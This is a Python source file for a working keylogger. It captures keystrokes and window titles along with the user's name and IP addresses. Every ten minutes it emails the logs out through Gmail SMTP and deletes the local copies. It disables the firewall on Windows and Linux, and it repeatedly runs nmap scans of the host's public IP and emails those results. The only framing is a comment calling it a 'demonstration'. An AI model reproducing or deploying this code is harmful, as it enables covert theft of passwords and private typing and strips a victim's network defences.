#imports
from pynput.keyboard import Key, Listener
import win32gui
import os
import time
import requests
import socket
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import platform
import subprocess
import config

# Gathering system information
datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())

# Initial log message
msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
logged_data = []
logged_data.append(msg)

old_app = ''
delete_file = []

# Function to log key presses
def on_press(key):
    global old_app
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    if new_app == 'Cortana':
        new_app = 'Windows Start Menu'

    if new_app != old_app and new_app != '':
        logged_data.append(f'[{datetime}] ~ {new_app}\n')
        old_app = new_app

    substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
                    'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
                    'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 
                    '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
                    '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

    key = str(key).strip('\'')
    if key in substitution:
        logged_data.append(substitution[substitution.index(key)+1])
    else:
        logged_data.append(key)

# Function to write logs to a file
def write_file(count):
    one = os.path.expanduser('~') + '/Downloads/'
    two = os.path.expanduser('~') + '/Pictures/'
    list = [one, two]

    filepath = random.choice(list)
    filename = str(count) + 'I' + str(random.randint(1000000, 9999999)) + '.txt'
    file = filepath + filename
    delete_file.append(file)

    with open(file, 'w') as fp:
        fp.write(''.join(logged_data))
    print('written all good')

# Function to send logs via email
def send_logs():
    count = 0
    fromAddr = config.fromAddr
    fromPswd = config.fromPswd
    toAddr = fromAddr

    while True:
        time.sleep(600)  # Every 10 minutes
        if len(logged_data) > 1:
            try:
                write_file(count)
                subject = f'[{user}] ~ {count}'

                msg = MIMEMultipart()
                msg['From'] = fromAddr
                msg['To'] = toAddr
                msg['Subject'] = subject
                body = 'testing'
                msg.attach(MIMEText(body, 'plain'))

                attachment = open(delete_file[0], 'rb')
                filename = delete_file[0].split('/')[2]

                part = MIMEBase('application', 'octet-stream')
                part.set_payload((attachment).read())
                encoders.encode_base64(part)
                part.add_header('content-disposition', f'attachment; filename={filename}')
                msg.attach(part)

                text = msg.as_string()
                s = smtplib.SMTP('smtp.gmail.com', 587)
                s.ehlo()
                s.starttls()
                s.ehlo()
                s.login(fromAddr, fromPswd)
                s.sendmail(fromAddr, toAddr, text)
                s.close()

                attachment.close()
                os.remove(delete_file[0])
                del logged_data[1:]
                del delete_file[0:]
                count += 1

            except Exception as errorString:
                print(f'[!] send_logs // Error.. ~ {errorString}')
                pass

# Function to perform Nmap scan and send results via email
def nmap_scan_and_send_email(target):
    while True:
        scan_command = f"nmap -sS -p- {target} -oN nmap_scan.txt"
        subprocess.run(scan_command, shell=True)

        with open("nmap_scan.txt", "r") as file:
            scan_results = file.read()

        msg = MIMEMultipart()
        msg['From'] = config.fromAddr
        msg['To'] = config.fromAddr
        msg['Subject'] = f'Nmap Scan Results for {target}'
        body = f'Nmap scan results:\n\n{scan_results}'
        msg.attach(MIMEText(body, 'plain'))

        text = msg.as_string()

        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(config.fromAddr, config.fromPswd)
        s.sendmail(config.fromAddr, config.fromAddr, text)
        s.close()

        time.sleep(600)  # Scan every 10 minutes

# Function to disable firewall and open all ports
def disable_firewall_and_open_ports():
    os_type = platform.system()
    if os_type == "Windows":
        disable_firewall_cmds = [
            "netsh advfirewall set allprofiles state off",
            "netsh advfirewall set currentprofile state off"
        ]
    elif os_type == "Linux":
        disable_firewall_cmds = [
            "iptables -P INPUT ACCEPT",
            "iptables -P FORWARD ACCEPT",
            "iptables -P OUTPUT ACCEPT",
            "iptables -F",
            "iptables -X",
            "systemctl stop ufw",
            "systemctl disable ufw"
        ]
    else:
        return
    
    for cmd in disable_firewall_cmds:
        subprocess.run(cmd, shell=True)

# Main Demonstration Function
def main():
    # Disable firewall and open all ports
    disable_firewall_and_open_ports()

    # Start keylogger thread
    T1 = threading.Thread(target=send_logs)
    T1.start()
    
    with Listener(on_press=on_press) as listener:
        listener.join()

    # Nmap scanning demonstration and sending results via email
    target = publicIP
    T2 = threading.Thread(target=nmap_scan_and_send_email, args=(target,))
    T2.start()

if __name__ == '__main__':
    main()
